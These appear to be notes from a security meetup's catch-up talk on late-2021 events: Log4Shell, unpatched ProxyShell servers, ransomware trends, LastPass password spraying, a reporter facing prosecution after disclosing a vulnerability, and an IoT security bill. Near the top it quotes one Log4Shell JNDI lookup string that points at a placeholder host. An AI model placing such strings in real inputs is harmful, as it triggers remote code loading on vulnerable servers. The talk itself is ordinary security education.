No meeting in 2021-11, no ICYMI 2021-12.  So today we play a bit of catch-up.  Did anything security-wise happen in the past couple months? No particular order for next slides.

Holy crud, it's another supply chain *FAIL*.

```${jndi:ldap://example.com/file}```

* why? where? how? what?
* v2.14 RCE and *leaking*, v2.15.0-rc1 fixes 2021-12-06
* mitigation provided but can workaround
* lots of vendors still on v1.2 (older vuln applies)
* v2.16 had potential (vulns), v2.17 looking good
* vendor responses vary in shady-ness

Initially, there was a flurry of searching and scanning and testing to find vulnerable products.  Now, actual attacks are underway.  Another tool on the belt for threat actors.

ProxyShell vulns big in August 2021, but did everyone patch for CVE-2021-34473, CVE-2021-34523, and CVE-2021-31207? Karver did a Shodan safari, some heads-up notices, dodged some flak (thanks, Joel), may have gotten some results -- think hospitals, a library, an ISP, oh, and a response from the baddies.

### 2021-00-00: Ransomware

Waiting for more publications of 2021 data.  There were some measurements that showed a trend toward lower average payments, but there were also indications of more dollars extorted.  Leaking and ransoming is the norm now for heavy targets.  CIS states still mostly ignored due to RaaS ToS, and some fear of big phish and US .gov entities now.

--

https://www.zdnet.com/article/lastpass-vp-says-no-indication-that-accounts-compromised-or-credentials-harvested-after-reports/

LastPass accounts were being popped -- or at least master passwords guessed, leading to a breach scare.  LastPass investigated and looks like just heavy password spraying attacks.

Yes, this is still going on.  "Gov. Mike Parson on Wednesday, Dec. 29, 2021, said he was confident a Cole County prosecutor will bring charges in the case of a Post-Dispatch reporter who alerted the state to a significant data vulnerability."

IoT standards bill -- a good start?

* No default passwords
* Vendor MUST have a vulnerability disclosure policy
* Vendor MUST be transparent about how long the product will receive security updates
